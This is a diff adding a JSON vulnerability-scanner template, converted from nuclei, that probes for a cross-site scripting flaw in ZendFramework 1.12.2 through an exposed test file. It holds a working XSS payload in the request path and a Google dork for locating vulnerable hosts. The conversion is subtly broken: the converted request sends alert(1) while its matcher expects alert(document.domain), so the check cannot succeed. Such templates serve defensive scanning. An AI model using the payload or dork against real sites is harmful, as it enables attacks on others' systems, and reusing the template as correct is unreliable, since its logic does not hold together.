@@ -1,0 +1,167 @@
+{
+  "id": "zend-v1-xss",
+  "name": "ZendFramework 1.12.2 - Cross-Site Scripting",
+  "author": "c3l3si4n",
+  "severity": "MEDIUM",
+  "description": "ZendFramework of versions \u003c\u003d1.12.2 contain a cross-site scripting vulnerability via an arbitrarily supplied parameter.\n",
+  "references": [
+    "https://twitter.com/c3l3si4n/status/1600035722148212737"
+  ],
+  "tags": [
+    "zend",
+    "zendframework",
+    "xss"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "google": "inurl:\"/tests/Zend/Http/\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?redirection\u003d3\u0026param\u003d\u003cimg/src\u003dx%20onerror\u003dalert(1)\u003e",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\"redirection\"]",
+            "\"param\"",
+            "\u003cimg/src\u003dx onerror\u003dalert(document.domain)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "text/html"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "zend-v1-xss",
+    "info": {
+      "name": "ZendFramework 1.12.2 - Cross-Site Scripting",
+      "author": "c3l3si4n",
+      "severity": "medium",
+      "description": "ZendFramework of versions \u003c\u003d1.12.2 contain a cross-site scripting vulnerability via an arbitrarily supplied parameter.\n",
+      "reference": [
+        "https://twitter.com/c3l3si4n/status/1600035722148212737"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 2,
+        "google_query": "inurl:\"/tests/Zend/Http/\""
+      },
+      "tags": "zend,zendframework,xss"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?redirection\u003d3\u0026param\u003d\u003cimg/src\u003dx%20onerror\u003dalert(1)\u003e",
+          "{{BaseURL}}/tests/Zend/Http/Client/_files/testRedirections.php?redirection\u003d3\u0026param\u003d\u003cimg/src\u003dx%20onerror\u003dalert(document.domain)\u003e"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\"redirection\"]",
+              "\"param\"",
+              "\u003cimg/src\u003dx onerror\u003dalert(document.domain)"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "text/html"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
